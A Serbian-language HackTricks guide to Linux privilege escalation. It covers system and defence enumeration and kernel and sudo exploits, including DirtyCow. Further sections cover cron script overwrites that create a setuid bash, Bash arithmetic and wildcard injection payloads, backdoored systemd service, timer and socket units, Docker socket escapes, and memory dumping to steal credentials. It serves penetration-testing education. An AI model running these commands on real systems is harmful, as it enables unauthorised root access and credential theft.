# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## System Information

### OS info

Počnimo sa prikupljanjem informacija o pokrenutom OS-u
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ako **imate dozvole za pisanje u bilo koji direktorijum unutar promenljive `PATH`**, možda ćete moći da hijack-ujete neke biblioteke ili binarne fajlove:
```bash
echo $PATH
```
### Env info

Postoje li zanimljive informacije, lozinke ili API ključevi u environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji se može iskoristiti za escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobar spisak ranjivih verzija kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Drugi sajtovi gde možete naći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izdvojili sve ranjive verzije kernela sa te stranice možete uraditi:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći pri pretrazi kernel exploits su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršiti na žrtvi, proverava samo exploits za kernel 2.x)

Uvek **pretraži verziju kernela na Google-u**, možda je tvoja verzija kernela pomenuta u nekom kernel exploit-u i tada ćeš biti siguran da je exploit validan.

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

Na osnovu ranjivih verzija sudo-a koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

Pogledajte **smasher2 box of HTB** za **primer** kako se ova vuln može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojte moguće odbrambene mere

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ako se nalazite u docker containeru, možete pokušati da iz njega pobegnete:


{{#ref}}
docker-security/
{{#endref}}

## Pogoni

Proverite **šta je montirano i šta nije**, gde i zašto. Ako je nešto nemontirano, možete pokušati da ga montirate i proverite ima li privatnih podataka.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni softver

Nabrojte korisne binarne fajlove
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **instaliran bilo koji compiler**. Ovo je korisno ako treba da koristite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instaliran ranjiv softver

Proverite **verziju instaliranih paketa i servisa**. Možda postoji neka stara Nagios verzija (na primer) koja bi mogla biti iskorišćena za escalating privileges…\
Preporučuje se ručno proveriti verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, takođe možete koristiti **openVAS** da proverite zastareli i ranjiv softver instaliran na mašini.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će većinom biti beskorisne, zato se preporučuje korišćenje aplikacija poput OpenVAS ili sličnih koje će proveriti da li je neka verzija instaliranog softvera ranjiva na poznate exploite_

## Procesi

Pogledajte **koji se procesi** izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda tomcat koji se izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li rade [**electron/cef/chromium debuggers** koji rade, možete ih iskoristiti za eskalaciju privilegija](electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom parametra `--inspect` u komandnoj liniji procesa.\
Takođe proverite svoje privilegije nad binaries procesa — možda možete prepisati nečiji.

### Praćenje procesa

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za praćenje procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada su ispunjeni određeni uslovi.

### Memorija procesa

Neki servisi na serveru čuvaju **credentials in clear text inside the memory**.\
Obično će vam trebati **root privileges** da pročitate memoriju procesa koji pripadaju drugim korisnicima, zato je ovo obično korisnije kada ste već root i želite da otkrijete više credentials.\
Međutim, zapamtite da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da većina mašina danas **ne dozvoljava ptrace po defaultu** što znači da ne možete dump-ovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše pristup ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu biti debug-ovani, sve dok imaju isti uid. Ovo je klasičan način na koji je ptracing funkcionisao.
> - **kernel.yama.ptrace_scope = 1**: samo roditeljski proces može biti debug-ovan.
> - **kernel.yama.ptrace_scope = 2**: samo admin može koristiti ptrace, jer zahteva CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces se ne može pratiti sa ptrace. Nakon podešavanja je potreban reboot da bi se ptrace ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer) možete dobiti Heap i pretražiti unutar njega za credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB skripta
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati PID procesa, **maps show how memory is mapped within that process's** virtuelnom adresnom prostoru; takođe prikazuje **dozvole svake mapirane regije**. Pseudo fajl **mem** **izlaže samu memoriju procesa**. Iz **maps** fajla znamo koje su **memorijske regije čitljive** i njihove offset-e. Koristimo ove informacije da **se pozicioniramo u mem fajlu i ispišemo sve čitljive regije** u fajl.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup sistemskoj **fizičkoj** memoriji, a ne virtuelnoj memoriji. Na virtuelni adresni prostor kernela može se pristupiti koristeći /dev/kmem.\
Obično je `/dev/mem` čitljiv samo od strane **root** i **kmem** grupe.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump je Linux varijanta klasičnog alata ProcDump iz Sysinternals paketa alata za Windows. Dostupan je na [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za dump memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti root zahteve i dump-ovati proces koji vam pripada
- Skript A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root je potreban)

### Kredencijali iz memorije procesa

#### Ručni primer

Ako otkrijete da proces authenticator radi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete dump the process (pogledajte prethodne sekcije da pronađete različite načine za dump memorije procesa) i pretražiti credentials u memoriji:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih fajlova**. Potrebne su root privilegije da bi ispravno radio.

| Funkcija                                          | Ime procesa          |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP konekcije)                    | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (aktivne SSH sesije - upotreba sudo)      | sshd:                |

#### Pretraga regex-a/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron jobs

Proverite da li je neki zakazani job ranjiv. Možda možete iskoristiti skriptu koja se izvršava kao root (wildcard vuln? možete modifikovati datoteke koje root koristi? koristiti symlinks? kreirati specifične datoteke u direktorijumu koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron putanja

Na primer, u _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju da korisnik "user" ima privilegije pisanja nad /home/user_)

Ako u ovom crontabu root pokuša da izvrši neku komandu ili skript bez podešene PATH varijable. Na primer: _\* \* \* \* root overwrite.sh_\\ Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

Ako skripta koju izvršava root sadrži “**\***” u komandi, možete to iskoristiti za neočekivane stvari (npr. privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard prethodnik putanje kao** _**/some/path/\***_ **, nije ranjiv (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za više trikova za iskorišćavanje wildcard-a:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash izvršava parameter/variable expansion i command substitution pre arithmetic evaluation u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja iz loga i ubacuje ih u aritmetički kontekst, napadač može injektovati command substitution $(...) koji će se izvršiti kao root kada cron pokrene.

- Zašto ovo funkcioniše: U Bash-u, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. Dakle, vrednost kao `$(/bin/bash -c 'id > /tmp/pwn')0` se prvo zameni (komanda se izvršava), a preostali numerički `0` se koristi za aritmetiku tako da skripta nastavlja bez greške.

- Tipičan ranjiv obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Eksploatacija: Naterajte da tekst koji kontroliše napadač bude upisan u parsovani log tako da polje koje izgleda kao broj sadrži command substitution i završava cifrom. Uverite se da vaša komanda ne ispisuje na stdout (ili je preusmerite) kako bi aritmetika ostala validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ako **možete izmeniti cron skriptu** koju izvršava root, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako script koji se izvršava kao root koristi **directory where you have full access**, možda bi bilo korisno obrisati taj folder i **create a symlink folder to another one** koji pokazuje na folder koji sadrži script pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Česti cron jobovi

Možete nadgledati procese kako biste pronašli one koji se izvršavaju svakih 1, 2 ili 5 minuta. Možda to možete iskoristiti i escalate privileges.

Na primer, da biste **nadgledali svakih 0.1s tokom 1 minuta**, **sortirali po najmanje izvršenim komandama** i obrisali komande koje su se izvršavale najviše, možete uraditi:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će nadgledati i prikazati svaki proces koji se pokrene).

### Nevidljivi cron jobovi

Moguće je kreirati cronjob **stavljanjem carriage return nakon komentara** (bez newline character), i cron job će raditi. Primer (obratite pažnju na carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servisi

### Upisivi _.service_ fajlovi

Proverite da li možete upisivati bilo koji `.service` fajl, ako možete, možete ga **izmeniti** tako da **pokrene** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate dok se mašina ne restartuje).\
Na primer kreirajte vaš backdoor unutar .service fajla sa **`ExecStart=/tmp/script.sh`**

### Upisivi binarni fajlovi servisa

Imajte na umu da ako imate **dozvole za pisanje nad binarnim fajlovima koje servisi izvršavaju**, možete ih promeniti u backdoors tako da kada se servisi ponovo izvrše backdoors budu izvršeni.

### systemd PATH - Relativne putanje

Možete videti PATH koji koristi **systemd** pomoću:
```bash
systemctl show-environment
```
Ako otkrijete da možete da **write** u bilo kom direktorijumu te putanje, možda ćete moći da **escalate privileges**. Potrebno je da tražite **relative paths being used on service configurations** fajlove kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim kreirajte **executable** sa **istim imenom kao relativna putanja binarnog fajla** unutar systemd PATH foldera u koji imate pravo pisanja, i kada servis bude zatražen da izvrši ranjivu akciju (**Start**, **Stop**, **Reload**), vaš **backdoor** će biti izvršen (neprivilegovani korisnici obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Timers**

**Timers** su systemd unit fajlovi čija se imena završavaju sa `**.timer**` koji kontrolišu `**.service**` fajlove ili događaje. **Timers** se mogu koristiti kao alternativa cron-u jer imaju ugrađenu podršku za kalendarske vremenske događaje i monotoničke vremenske događaje i mogu se izvršavati asinhrono.

Možete izlistati sve **Timers** pomoću:
```bash
systemctl list-timers --all
```
### Writable timers

Ako možete izmeniti timer, možete ga naterati da pokrene neke jedinice systemd.unit (kao što su `.service` ili `.target`)
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Jedinica (Unit) koja se aktivira kada ovaj timer istekne. Argument je ime unit-a, čiji sufiks nije ".timer". Ako nije navedeno, ova vrednost podrazumevano pokazuje na service koji ima isto ime kao timer unit, osim sufiksa. (Vidi gore.) Preporučuje se da ime unit-a koji se aktivira i ime timer unit-a budu identična, osim sufiksa.

Stoga, da biste zloupotrebili ovu dozvolu potrebno je da:

- Pronađite neku systemd unit (npr. `.service`) koja **izvršava binarni fajl koji je upisiv**
- Pronađite neku systemd unit koja **izvršava relativnu putanju** i nad kojom imate **upisne privilegije** nad **systemd PATH** (da imitirate taj izvršni fajl)

**Saznajte više o timerima pomoću `man systemd.timer`.**

### **Omogućavanje Timera**

Da biste omogućili timer potrebne su root privilegije i izvršenje:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Imajte na umu da je **timer** **aktiviran** pravljenjem symlinka ka njemu na `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Soketi

Unix Domain Sockets (UDS) omogućavaju **komunikaciju procesa** na istoj ili na različitim mašinama u okviru client-server modela. Koriste standardne Unix descriptor fajlove za međuračunarsku komunikaciju i konfigurišu se putem `.socket` fajlova.

Soketi se mogu konfigurisati pomoću `.socket` fajlova.

**Saznajte više o sockets sa `man systemd.socket`.** U ovom fajlu može se konfigurisati nekoliko interesantnih parametara:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ove opcije se razlikuju, ali u suštini služe da **naznače gde će socket slušati** (putanja AF_UNIX socket fajla, IPv4/6 i/ili broj porta koji se sluša, itd.)
- `Accept`: Prima boolean argument. Ako je **true**, za svaku dolaznu konekciju se pokreće **instanca servisa** i samo konekcijski socket se prosleđuje toj instanci. Ako je **false**, svi slušaći socketi sami se **prosleđuju pokrenutoj service jedinici**, i samo jedna service jedinica se pokreće za sve konekcije. Ova vrednost se ignoriše za datagram sokete i FIFO-e gde jedna service jedinica bezuslovno obrađuje sav dolazni saobraćaj. **Podrazumevano je false**. Iz razloga performansi, preporučuje se da se novi daemoni pišu tako da budu pogodni za `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Prihvataju jednu ili više komandnih linija, koje se **izvršavaju pre** ili **posle** kreiranja i vezivanja slušaćih **soketa**/FIFO-ova, redom. Prvi token komandne linije mora biti apsolutno ime fajla, nakon čega slede argumenti procesa.
- `ExecStopPre`, `ExecStopPost`: Dodatne **komande** koje se **izvršavaju pre** ili **posle** zatvaranja i uklanjanja slušaćih **soketa**/FIFO-ova, redom.
- `Service`: Navodi ime **service** jedinice koja će se **aktivirati** na **dolazni saobraćaj**. Ovo podešavanje je dozvoljeno samo za sokete sa Accept=no. Podrazumevano je servis koji nosi isto ime kao socket (sa izmenjenim sufiksom). U većini slučajeva nije neophodno koristiti ovu opciju.

### Upisivi .socket fajlovi

Ako nađete **upisiv** `.socket` fajl, možete **dodati** na početak `[Socket]` sekcije nešto poput: `ExecStartPre=/home/kali/sys/backdoor` i backdoor će biti izvršen pre nego što se socket kreira. Dakle, **verovatno ćete morati da sačekate restart mašine.**\
_Imajte na umu da sistem mora koristiti tu konfiguraciju socket fajla inače backdoor neće biti izvršen_

### Upisivi soketi

Ako **identifikujete bilo koji upisiv socket** (_sada govorimo o Unix soketima i ne o konfiguracionim `.socket` fajlovima_), tada **možete komunicirati** sa tim socketom i možda iskoristiti neku ranjivost.

### Enumeracija Unix soketa
```bash
netstat -a -p --unix
```
### Sirova konekcija
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Primer eksploatacije:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Imajte na umu da mogu postojati neki **sockets listening for HTTP** requests (_Ne mislim na .socket files, već na fajlove koji se ponašaju kao unix sockets_). Možete to proveriti pomoću:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Ako socket **odgovori na HTTP** zahtev, onda možete **komunicirati** sa njim i možda **iskoristiti neku ranjivost**.

### Docker socket koji je upisiv

Docker socket, često se nalazi na `/var/run/docker.sock`, je kritičan fajl koji treba zaštititi. Podrazumevano je upisiv od strane korisnika `root` i članova grupe `docker`. Imati pristup za pisanje na ovaj socket može dovesti do privilege escalation. Evo pregleda kako se to može uraditi i alternativnih metoda ako Docker CLI nije dostupan.

#### **Privilege Escalation with Docker CLI**

Ako imate pristup za pisanje na Docker socket, možete escalate privileges koristeći sledeće komande:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Ove komande vam omogućavaju da pokrenete container sa root pristupom fajl sistemu hosta.

#### **Korišćenje Docker API-ja direktno**

U slučajevima kada Docker CLI nije dostupan, Docker socket se i dalje može manipulisati koristeći Docker API i `curl` komande.

1.  **List Docker Images:** Preuzmite listu dostupnih images.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** Pošaljite zahtev za kreiranje container-a koji mount-uje root direktorijum host sistema.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** Koristite `socat` da uspostavite konekciju ka container-u, omogućavajući izvršavanje komandi unutar njega.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Nakon uspostavljanja `socat` konekcije, možete izvršavati komande direktno u container-u sa root pristupom fajl sistemu hosta.

### Ostalo

Imajte na umu da ako imate write permissions nad docker socket-om zato što ste **inside the group `docker`** imate [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group). Ako [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Pogledajte **more ways to break out from docker or abuse it to escalate privileges** u:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

If you find that you can use the **`ctr`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

If you find that you can use the **`runc`** command read the following page as **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus je sofisticiran **inter-Process Communication (IPC) system** koji omogućava aplikacijama da efikasno komuniciraju i razmenjuju podatke. Dizajniran sa modernim Linux sistemom na umu, pruža robustan okvir za različite oblike komunikacije između aplikacija.

Sistem je svestran, podržava osnovni IPC koji poboljšava razmenu podataka između procesa, podsećajući na **enhanced UNIX domain sockets**. Pored toga, pomaže u emitovanju događaja ili signala, podstičući besprekornu integraciju među komponentama sistema. Na primer, signal od Bluetooth daemona o dolazećem pozivu može naterati music player da utiša zvuk, poboljšavajući korisničko iskustvo. Dodatno, D-Bus podržava remote object system, pojednostavljujući zahteve za servisima i pozive metoda između aplikacija, pojednostavljujući procese koji su tradicionalno bili složeni.

D-Bus radi na **allow/deny model**, upravljajući permisijama poruka (pozivi metoda, emitovanje signala, itd.) na osnovu kumulativnog efekta poklapanja policy pravila. Ove politike specificiraju interakcije sa bus-om, što potencijalno može omogućiti privilege escalation kroz eksploatisanje ovih permisija.

Primer takve politike u `/etc/dbus-1/system.d/wpa_supplicant.conf` je dat, detaljno navodeći permisije za root korisnika da poseduje, šalje i prima poruke od `fi.w1.wpa_supplicant1`.

Politike bez specificiranog korisnika ili grupe se primenjuju univerzalno, dok se "default" context politike primenjuju na sve koji nisu pokriveni drugim specifičnim politikama.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Saznajte ovde kako da enumerate i exploit D-Bus komunikaciju:**


{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Mreža**

Uvek je zanimljivo enumerate mrežu i utvrditi poziciju mašine.

### Generička enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Open ports

Uvek proveri network services koji rade na mašini sa kojom nisi mogao da interaguješ pre nego što si joj pristupio:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Proverite da li možete sniff traffic. Ako možete, mogli biste uspeti da dobijete neke credentials.
```
timeout 1 tcpdump
```
## Korisnici

### Generička enumeracija

Proverite **ko** ste, koje **privilegije** imate, koji **korisnici** su u sistemu, koji se mogu **prijaviti** i koji imaju **root privilegije:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Veliki UID

Neke verzije Linuxa su bile pogođene bugom koji omogućava korisnicima sa **UID > INT_MAX** da eskaliraju privilegije. Više info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
